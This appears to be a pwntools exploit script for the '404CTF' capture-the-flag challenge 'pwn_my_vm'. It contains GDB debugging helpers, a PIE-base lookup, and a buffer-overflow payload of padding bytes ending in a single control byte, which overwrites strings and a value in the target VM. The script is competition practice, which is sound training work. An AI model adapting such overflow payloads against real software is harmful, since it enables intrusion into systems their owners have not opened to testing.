#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vm')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 30813)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, api=True, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=['pwn_my_vm.vmr'], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def getPIEBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").read().splitlines()
    return int(memory_map[0].split(b"-")[0], 16)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak *main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

if args.GDB:
    pie_base = getPIEBase(io)
    print(f'{pie_base = :x}')
    io.gdb.execute(f'decompiler connect ghidra')
    io.gdb.execute(f'b *main')
    # io.gdb.execute(f'b *0x{pie_base + 0x0001440:x}') # Before opcode switch
    # io.gdb.execute(f'b *0x{pie_base + 0x0001f7f:x}') # after getline
    io.gdb.execute(f'b *0x{pie_base + 0x0001af6:x}') # ret
    io.gdb.execute(f'c')

p =  b'A'*0X14 # Fill Buffer
p += b'B'*0x13 # Overwrite "What's your name ?"
p += b'C'*0X1e # Overwrite "That's a realy nice name !"
p += b'\x0e'

io.sendline(p)
    

print(io.recvall().decode())

